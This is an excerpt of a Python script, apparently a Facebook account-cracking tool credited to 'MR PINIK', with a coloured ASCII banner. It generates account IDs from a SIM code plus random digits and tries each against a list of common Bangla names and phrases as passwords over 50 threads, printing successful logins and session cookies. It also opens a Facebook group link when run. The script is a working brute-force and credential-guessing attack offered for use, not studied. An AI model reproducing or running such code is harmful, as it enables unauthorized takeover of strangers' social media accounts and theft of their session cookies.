# OWNER BY SCRIPT : MR PINIK × MR-PAPI
# GITHUB LINK : PAPI-X × PINIK-777
# MACK BY : MR PINIK 
#_________Full Script__________#
...
logo=("""
 ...
 \x1b[38;5;40m ██      ██ ██   ████ ██ ██   ██  [V-0.2]
\033[1;96m═════════════════════════════════════════════
\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m ANOTHER  \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mMR\x1b[38;5;244m]\x1b[1;97mx\x1b[38;5;244m[\x1b[38;5;46mPINIK\x1b[38;5;244m]\x1b[1;97m
\x1b[38;5;244m(\x1b[1;97m✘\x1b[38;5;244m)\x1b[38;5;46m FACEBOOK \x1b[38;5;244m–\x1b[38;5;46m➤\x1b[38;5;244m [\x1b[38;5;46mMR-PINIK\x1b[38;5;244m] \x1b[1;97m  
...
def fuck():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=50) as PINIK:
        os.system('clear')
        print(logo)
        os.system('xdg-open https://www.facebook.com/groups/668666148068158/')
        tl = str(len(user))
        print('\033[1;37m[\033[1;32m✓\033[1;32m] SIM CODE : '+nude)
        print('\033[1;37m[\033[1;32m✓\033[1;32m] WAIT 5 MIN FOR CRACK ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] JOIN MY GROUP ')
        print('\033[1;37m[\033[1;32m✓\033[1;32m] TOTAL ID : '+tl)
        print('\033[1;32m─────────────────────────────────────────────────────')
        for guru in user:
            uid = nude+nudex+nud+guru
            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla','@@##@@','@@@###','aaabbb','bangladesh','Bangladesh','mehedi','mababa','taniya','sumaiya','saiful','jannatul','Fatema','farjana','sabbir','humaira','alamin','mimmim','aaabbb','hridoy','fariya','shakil','roksana','mafiya','habiba','free fire','shahin','i love you','sadiya','ayesha','nusrat','Bangla','arfan@#','gaming','tamanna','jannat','laboni'] 
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;31m[%sPINIK🍁XD\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
            sys.stdout.flush()
...
#' \n\033[1;33m [😈] \033[1;32mUa = \033[1;34m'+pro+'  \033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[PINIK-CP💔] {uid} • {ps}")
